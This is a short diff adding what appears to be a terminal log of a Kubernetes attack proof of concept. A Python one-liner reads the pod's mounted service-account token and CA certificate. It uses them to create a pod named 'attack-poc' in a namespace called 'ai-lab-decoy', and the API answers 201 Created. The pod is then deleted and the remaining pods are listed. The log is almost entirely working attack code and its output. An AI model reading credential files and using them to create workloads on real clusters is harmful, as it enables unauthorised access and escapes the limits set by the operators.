@@ -1,0 +1,29 @@
+# python3 -c "
+import httpx
+token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
+pod_spec = {
+    'apiVersion': 'v1',
+    'kind': 'Pod',
+    'metadata': {'name': 'attack-poc', 'namespace': 'ai-lab-decoy'},
+    'spec': {
+        'containers': [{'name': 'poc', 'image': 'busybox', 'command': ['sleep', '3600']}]
+    }
+}
+r = httpx.post(
+    'https://kubernetes.default.svc/api/v1/namespaces/ai-lab-decoy/pods',
+    headers={'Authorization': f'Bearer {token}'},
+    json=pod_spec,
+    verify='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+)
+print(r.status_code)
+print(r.text)
+"
+201
+{"kind":"Pod","apiVersion":"v1","metadata":{"name":"attack-poc","namespace":"ai-lab-decoy","uid":"8cff6d06-dd51-4535-ab6e-26e142f696b7","resourceVersion":"461949", ... "status":{"phase":"Pending","qosClass":"BestEffort"}}
+
+# kubectl -n ai-lab-decoy delete pod attack-poc
+pod "attack-poc" deleted
+
+# kubectl -n ai-lab-decoy get pods
+NAME                        READY   STATUS    RESTARTS   AGE
+postgres-55478d7cdc-tl6j2   1/1     Running   0          22m
